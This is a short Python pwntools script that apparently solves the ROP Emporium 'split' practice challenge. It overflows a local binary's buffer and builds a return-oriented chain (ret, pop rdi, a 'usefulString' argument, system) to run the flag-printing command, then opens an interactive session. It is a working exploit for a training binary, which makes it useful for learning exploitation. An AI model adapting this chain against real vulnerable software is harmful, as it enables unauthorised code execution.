from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./split', checksec=False)

p = process("./split")

#gdb.attach(p, gdbscript='''''')

ret = ROP(elf).find_gadget(["ret"])[0]
pop_rdi_ret = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
system = elf.sym['system']
strings_cat_flag = elf.sym['usefulString']

payload = flat(
    cyclic(0x28),
    ret,
    pop_rdi_ret,
    strings_cat_flag,
    system
    )
p.sendlineafter(b">",payload)
p.interactive()
